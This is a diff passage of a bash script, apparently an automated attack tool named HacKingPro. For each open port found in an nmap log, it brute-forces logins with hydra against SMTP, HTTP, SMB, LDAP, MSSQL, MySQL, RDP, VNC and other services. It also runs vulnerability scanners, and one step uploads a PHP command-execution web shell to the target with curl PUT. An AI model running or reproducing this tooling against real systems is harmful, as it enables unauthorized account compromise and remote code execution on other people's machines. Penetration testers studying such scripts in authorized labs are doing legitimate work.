+	    hydra -L $smtp_u -P $smtp_p ${targetIP} smtp -e ns -o Output/${targetIP}/smtp_${targetIP}.txt -I -V -t $thread
+      hydra -L $user -P $pass ${targetIP} smtp -e ns -o Output/${targetIP}/smtp1_${targetIP}.txt -I -V -t $thread
+      Finished_Brute "${targetIP}"
+    else
+      BruteSMTP_Close="$(echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 25(SMTP) is not open. Skipping to next port...")"
+      AfterBruteSMTP="${BruteSMTP_Close}"
+      echo "${AfterBruteSMTP}"
+    fi
+ }
+  BruteSMTP
+
+  #  Port 80 - (HTTP)
+  BruteHTTP(){
+    # - Server:
+    # - Scripting language:
+    # - Apache Modules:
+    # - Domain-name address:
+    # - Web application
+    # - Name:
+    # - Version:
+   if grep -q 80/tcp nmap.log; then
+     echo "        ${AfterBruteHTTP} ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 80(HTTP) is open. Starting bruteforce...\n"
+     BruteHTTP_Open="$(echo " ${BBlue}[${BGreen} Open ${BBlue}] ")"
+     AfterBruteHTTP="${BruteHTTP_Open}"
+     echo ""
+     # Nikto
+     nikto -h http://${targetIP}
+
+     # Nikto with squid proxy
+     nikto -h ${targetIP} -useproxy http://${targetIP}:4444
+
+     # Get header
+     curl -i ${targetIP}
+
+     # Get everything
+     curl -i -L ${targetIP}
+
+     # Check if it is possible to upload using put
+     curl -v -X OPTIONS http://${targetIP}/
+     curl -v -X PUT -d '<?php system($_GET["cmd"]); ?>' http://${targetIP}/test/shell.php
+
+     # Check for title and all links
+     dotdotpwn.pl -m http -h ${targetIP} -M GET -o unix
+
+	   sleep 1
+	   hydra -L $user -P $pass ${targetIP} service http-get -o Output/${targetIP}/http-get_${targetIP}.txt -I -V / -t $thread
+     Finished_Brute "${targetIP}"
+   else
+
+     echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 80(HTTP) is not open. Skipping to next port..."
+     BruteHTTP_Close="$(echo " ${BBlue}[${BRed} Closed ${BBlue}] ")"
+     AfterBruteHTTP="${BruteHTTP_Close}"
+     # echo "${AfterBruteHTTP}"
+   fi
+ }
+  BruteHTTP
+
+  #  Port 110 - (POP3)
+  BrutePOP3(){
+    # - Name:
+    # - Version:
+    if grep -q 110/tcp nmap.log; then
+      echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 110(POP3) is open. Starting bruteforce...\n"
+      sleep 1
+      hydra -L $pop_u -P $pop_p ${targetIP} pop3 -e ns -o Output/${targetIP}/pop3_${targetIP}.txt -I -V -t $thread
+      hydra -L $user -P $pass ${targetIP} pop3 -e ns -o Output/${targetIP}/pop3_1_${targetIP}.txt -I -V -t $thread
+      Finished_Brute "${targetIP}"
+    else
+      echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 110(POP3) is not open. Skipping to next port..."
+    fi
+  }
+  BrutePOP3
+
+  #  Port 139 - (SMB)
+  BruteSMB(){
+    # - Name:
+    # - Version:
+    # - Domain/workgroup name:
+    # - Domain-sid:
+    # - Allows unauthenticated login:
+    if grep -q 139/tcp nmap.log; then
+      echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 139(SMB) is open. Starting bruteforce...\n"
+      sleep 1
+      enum4linux -a ${targetIP}
+      smbclient -L ${targetIP}
+      nmap --script=smb-enum-shares.nse,smb-ls.nse,smb-enum-users.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-security-mode.nse,smbv2-enabled.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-regsvc-dos.nse,smbv2-enabled.nse ${targetIP} -p 445
+      hydra -L $windows_u -P $pass ${targetIP} smb -S 139 -e ns -o Output/${targetIP}/smb_139_${targetIP}.txt -I -V -t $thread
+      Finished_Brute "${targetIP}"
+    else
+      echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 139(SMB) is not open. Skipping to next port..."
+    fi
+
+  }
+  BruteSMB
+
+  #  Port 162 - (SNMP)
+  BruteSNMP(){
+    if grep -q 162/tcp nmap.log; then
+      echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 162(SNMP) is open. Starting bruteforce..."
+      sleep 1
+      nmap -vv -sV -sU -Pn -p 161,162 --script=snmp-netstat,snmp-processes ${targetIP}
+      snmp-check -t ${targetIP} -c public  # Common community strings:    [  public   /   private   /   community  ]
+
+      hydra -P $snmp snmp -S 162 -e ns -o Output/${targetIP}/snmp_${targetIP}.txt -I -V -t $thread
+      Finished_Brute "${targetIP}"
+    else
+      echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 162(SNMP) is not open. Skipping to next port..."
+    fi
+  }
+  BruteSNMP
+
+  #  Port 389 - (LDAP)
+  BruteLDAP(){
+    if grep -q 389/tcp nmap.log; then
+      echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 389(LDAP) is open. Starting bruteforce...\n"
+      sleep 1
+      hydra -L $windows_u -P $pass ${targetIP} service ldap2 -S 389 -e ns -o Output/${targetIP}/ldap2_${targetIP}.txt -I -V -t $thread
+      hydra -L $windows_u -P $pass ${targetIP} service ldap3 -S 389 -e ns -o Output/${targetIP}/ldap3_${targetIP}.txt -I -V -t $thread
+      Finished_Brute "${targetIP}"
+    else
+      echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 389(LDAP) is not open. Skipping to next port..."
+    fi
+
+  }
+  BruteLDAP
+
+  #  Port 443 - (HTTPS)
+  BruteHTTPS(){
+    if grep -q 443/tcp nmap.log; then
+      echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 443(HTTPS) is open. Starting bruteforce...\n"
+      sleep 1
+      sslscan ${targetIP}:443
+      hydra -l $user -P $pass ${targetIP} service https-get -s 443 -o Output/${targetIP}/https-get_${targetIP}.txt -I -V -m / -t $thread
+      Finished_Brute "${targetIP}"
+    else
+      echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 443(HTTPS) is not open. Skipping to next port..."
+    fi
+  }
+  BruteHTTPS
+
+  #  Port 445 - (SMB)
+  BruteSMB445(){
+    if grep -q 445/tcp nmap.log; then
+      echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 445(SMB) is open. Starting bruteforce...\n"
+      sleep 1
+      enum4linux -a ${targetIP}
+      smbclient -L ${targetIP}
+      nmap --script=smb-enum-shares.nse,smb-ls.nse,smb-enum-users.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-security-mode.nse,smbv2-enabled.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-regsvc-dos.nse,smbv2-enabled.nse ${targetIP} -p 445
+      hydra -C $windows_up ${targetIP} smb -S 445 -e ns -o Output/${targetIP}/smb_445_${targetIP}.txt -I -V -t $thread
+      hydra -L $windows_u -P $pass ${targetIP} smb -S 445 -e ns -o Output/${targetIP}/smb_445_2_${targetIP}.txt -I -V -t $thread
+      Finished_Brute "${targetIP}"
+    else
+     echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 445(SMB) is not open. Skipping to next port..."
+   fi
+  }
+  BruteSMB445
+
+  #  Port 512 - (Rexec)
+  BruteREXEC(){
+    if grep -q 512/tcp nmap.log; then
+      echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 512(rexec) is open. Starting bruteforce...\n"
+      sleep 1
+      hydra -L $user -P $pass ${targetIP} rexec -S 512 -e ns -o Output/${targetIP}/rexec_${targetIP}.txt -I -V -t $thread
+      Finished_Brute "${targetIP}"
+    else
+      echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 512(rexec) is not open. Skipping to next port..."
+    fi
+  }
+  BruteREXEC
+
+  #  Port 513 - (Rlogin)
+  BruteRLOGIN(){
+    if grep -q 513/tcp nmap.log; then
+      echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 513(rlogin) is open. Starting bruteforce...\n"
+      sleep 1
+      hydra -L $user -P $pass ${targetIP} rlogin -S 513 -e ns -o Output/${targetIP}/rlogin_${targetIP}.txt -I -V -t $thread
+      Finished_Brute "${targetIP}"
+    else
+     echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 513C(rlogin) is not open. Skipping to next port..."
+   fi
+  }
+  BruteRLOGIN
+
+  #  Port 514 - (RSH)
+  BruteRSH(){
+    if grep -q 514/tcp nmap.log; then
+      echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 514(rsh) is open. Starting bruteforce...\n"
+      sleep 1
+      hydra -L $user -P $pass ${targetIP} rsh -S 514 -e ns -o Output/${targetIP}/rsh_${targetIP}.txt -I -V -t $thread
+      Finished_Brute "${targetIP}"
+    else
+      echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 514(rsh) is not open. Skipping to next port..."
+    fi
+  }
+  BruteRSH
+
+  #  Port 993 - (IMAP)
+  BruteIMAP(){
+    if grep -q 993/tcp nmap.log; then
+      echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 993(IMAP) is open. Starting bruteforce...\n"
+      sleep 1
+      hydra -L $user -P $pass ${targetIP} imap -S 993 -e ns -o Output/${targetIP}/imap_${targetIP}.txt -I -V -t $thread
+      Finished_Brute "${targetIP}"
+    else
+      echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 993(IMAP) is not open. Skipping to next port..."
+    fi
+  }
+  BruteIMAP
+
+  #  Port 1433 - (MSSQL)
+  BruteMSSQL(){
+     # - Version:
+
+     # use auxiliary/scanner/mssql/mssql_ping
+     # Last options. Brute force.
+     # scanner/mssql/mssql_login
+
+     # If you have credentials look in metasploit for other modules
+
+     # Log in to mssql
+     # sqsh -S INSERTIPADDRESS -U sa
+
+     # Execute commands
+     # xp_cmdshell 'date'
+     # go
+     if grep -q 1433/tcp nmap.log; then
+       echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 1433(mssql) is open. Starting bruteforce.../n"
+       sleep 1
+
+       hydra -C $mssql_up ${targetIP} mssql -S 1433 -e ns -o Output/${targetIP}/mssql_${targetIP}.txt -I -V -t $thread
+       hydra -L $windows_u -P $pass ${targetIP} mssql -S 1433 -e ns -o Output/${targetIP}/mssql_1_${targetIP}.txt -I -V -t $thread
+       Finished_Brute "${targetIP}"
+     else
+       echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 1433(mssql) is not open. Skipping to next port..."
+     fi
+
+   }
+  BruteMSSQL
+
+  # Port 1521 - (Oracle)
+  BruteOracle(){
+    # - Name:
+    # - Version:
+    # - Password protected:
+    if grep -q 1521/tcp nmap.log; then
+      echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 1521(oracle) is open. Starting bruteforce...\n"
+      sleep 1
+      tnscmd10g version -h ${targetIP}
+      tnscmd10g status -h ${targetIP}
+      hydra -C $oracle_up ${targetIP} oracle -S 1521 -e ns -o Output/${targetIP}/oracle_${targetIP}.txt -I -V -t $thread
+      Finished_Brute "${targetIP}"
+    else
+     echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 1521(oracle) is not open. Skipping to next port..."
+   fi
+
+  }
+  BruteOracle
+
+  ### Port 2049 - NFS
+  # showmount -e INSERTIPADDRESS
+  ### If you find anything you can mount it like this:
+  # mount INSERTIPADDRESS:/ /tmp/NFS
+  # mount -t INSERTIPADDRESS:/ /tmp/NFS
+
+  #  Port 3306 (MySQL)
+  BruteMySQL(){
+     # - Name:
+     # - Version:
+     if grep -q 3306/tcp nmap.log; then
+       echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 3306(mysql) is open. Starting bruteforce...\n"
+       sleep 1
+       mysql --host=${targetIP} -u root -p
+       nmap -sV -Pn -vv -script=mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 ${targetIP} -p 3306
+
+       hydra -C $mysql_up ${targetIP} mysql -e ns -o Output/${targetIP}/mysql_${targetIP}.txt -I -V -t $thread
+       hydra -L $sql_u -P $sql_p $TARGET mysql -e ns -o Output/${targetIP}/mysql_1_${targetIP}.txt -I -V -t $thread
+       Finished_Brute "${targetIP}"
+     else
+    echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 3306(mysql) is not open. Skipping to next port..."
+  fi
+
+   }
+  BruteMySQL
+
+  ### Port 3339 - Oracle web interface
+  # - Basic info about web service (apache, nginx, IIS)
+  # - Server:
+  # - Scripting language:
+  # - Apache Modules:
+  # - IP-address:
+  # - Domain-name address:
+
+  #  Port 3389 (RDP) Remote Desktop
+  BruteRDP(){
+     # Test logging in to see what OS is running
+     # rdesktop -u guest -p guest ${targetIP} -g 94%
+
+     # Brute force
+     # ncrack -vv --user Administrator -P /root/oscp/passwords.txt rdp://${targetIP}
+
+     if grep -q 3389/tcp nmap.log; then
+       echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 3389(RDP) is open. Starting bruteforce...\n"
+       sleep 1
+       hydra -C $windows_u ${targetIP} rdp -e ns -o Output/${targetIP}/rdp_${targetIP}.txt -I -V -t $thread
+       hydra -L $windows_u -P $pass ${targetIP} rdp -e ns -o Output/${targetIP}/rdp_1_${targetIP}.txt -I -V -t $thread
+       Finished_Brute "${targetIP}"
+     else
+    echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 3389(RDP) is not open. Skipping to next port..."
+  fi
+
+   }
+  BruteRDP
+
+  #  Port 5432 (PostGres)
+  BrutePostgres(){
+    if grep -q 5432/tcp nmap.log; then
+      echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 5432(postgres) is open. Starting bruteforce...\n"
+      sleep 1
+      hydra -C $postgres_up ${targetIP} postgres -e ns -o Output/${targetIP}/postgres_1_${targetIP}.txt -I -V -t $thread
+      Finished_Brute "${targetIP}"
+    else
+      echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 5432(postgres) is not open. Skipping to next port..."
+    fi
+  }
+  BrutePostgres
+
+  #  Port 5900 (VNC)
+  BruteVNC(){
+    if grep -q 5900/tcp nmap.log; then
+      echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 5900(VNC) is open. Starting bruteforce...\n"
+      sleep 1
+      hydra -P $vnc_p ${targetIP} vnc -S 5900 -e ns -o Output/${targetIP}/vnc_5900_${targetIP}.txt -I -V -t $thread
+      hydra -P $pass ${targetIP} vnc -S 5900 -e ns -o Output/${targetIP}/vnc_5900_1_${targetIP}.txt -I -V -t $thread
+      Finished_Brute "${targetIP}"
+    else
+      echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 5900(VNC) is not open. Skipping to next port..."
+    fi
+  }
+  BruteVNC
+
+  #  Port 5901 (VNC)
+  BruteVNC5901(){
+   if grep -q 5901/tcp nmap.log; then
+    echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 5901(VNC) is open. Starting bruteforce...\n"
+		sleep 1
+		hydra -P $vnc_p ${targetIP} vnc -S 5901 -e ns -o Output/${targetIP}/vnc_5901_${targetIP}.txt -I -V -t $thread
+		hydra -P $pass ${targetIP} vnc -S 5901 -e ns -o Output/${targetIP}/vnc_5901_${targetIP}.txt -I -V -t $thread
+		Finished_Brute "${targetIP}"
+   else
+    echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 5901(VNC) is not open. Skipping to next port..."
+   fi
+}
+  BruteVNC5901
+
+  #  Port 6667 (IRC)
+  BruteIRC(){
+    if grep -q 6667/tcp nmap.log; then
+      echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 6667(IRC) is open. Starting bruteforce...\n"
+      sleep 1
+      hydra -L $user -P $pass ${targetIP} irc -s 6667 -e ns -o Output/${targetIP}/irc_${targetIP}.txt -I -V -t $thread
+      Finished_Brute "${targetIP}"
+    else
+      echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 6667(IRC) is not open. Skipping to next port..."
+    fi
+  }
+  BruteIRC
+
+  #  Port 8000 (HTTP HEAD)
+  BruteHTTP8000(){
+    if grep -q 8000/tcp nmap.log; then
+      echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 8000(HTTP HEAD) is open. Starting bruteforce...\n"
+      sleep 1
+      hydra -L $user -P $pass ${targetIP} http-head -s 8000 -f -q -e ns -o Output/${targetIP}/http-head_8000_${targetIP}.txt -I -V -m / -t $thread
+      Finished_Brute "${targetIP}"
+    else
+      echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 514(HTTP HEAD) is not open. Skipping to next port..."
+    fi
+  }
+  BruteHTTP8000
+
+  #  Port 8080 (HTTP HEAD)
+  BruteHTTP8080(){
+    if grep -q 8080/tcp nmap.log; then
+      echo "        ${BBlue}|──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 8080(HTTP HEAD) is open. Starting bruteforce...\n"
+      sleep 1
+      hydra -L $user -P $pass ${targetIP} http-head -S 8080 -f -q -e ns -o Output/${targetIP}/http-head_8080_${targetIP}.txt -I -V -m / -t $thread
+      Finished_Brute "${targetIP}"
+    else
+      echo "        ${BBlue}|──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 8080(HTTP HEAD) is not open. Skipping to next port..."
+    fi
+  }
+  BruteHTTP8080
+
+  #  Port 8100 (HTTP HEAD)
+  BruteHTTP8100(){
+    if grep -q 8100/tcp nmap.log; then
+      echo "        ${BBlue}└──[${BRed} 🎯 ${BBlue}]──╼ ${BGreen} Port 8100(HTTP HEAD) is open. Starting bruteforce...\n"
+      sleep 1
+      hydra -L $user -P $pass ${targetIP} http-head -S 8100 -f -q -e ns -o Output/${targetIP}/http-head_8100_${targetIP}.txt -I -V -m / -t $thread
+      Finished_Brute "${targetIP}"
+    else
+      echo "        ${BBlue}└──[${BRed} ❌ ${BBlue}]──╼ ${BRed} Port 8100(HTTP HEAD) is not open. Quitting..."
+    fi
+  }
+  BruteHTTP8100
+
+  read -p "$Press_ENTER"
+
+  if [ "$1" = "--help" ] || [ "$1" = "-h" ]; then
+  	help
+  	exit
+  fi
+
+  if [ ! -z "$2" ]; then
+  	if [ "$2" -gt "64" ] || [ "$2" -lt "1" ]; then
+  		echo -e "[${red}!${default}] Maximum number of threads is 64!"
+  		exit
+  	else
+  		thread=$2
+  	fi
+  fi
+
+  if [[ -f $1 ]]; then
+  	while IFS= read -r line; do
+  		sleep 1
+  		report $line
+  		port_scan $line
+  		BrutePort $line $2
+  	done < "$1"
+  	exit
+  fi
+
+  # sleep 1
+  # report $1
+  # port_scan $1
+  # BrutePort $1 $2
+
+  read -p "$Press_ENTER"
+
+
+}
+
+###############################################
+#         Run/Start HacKingPro Main Menu
 ###############################################
 
 MainMenu
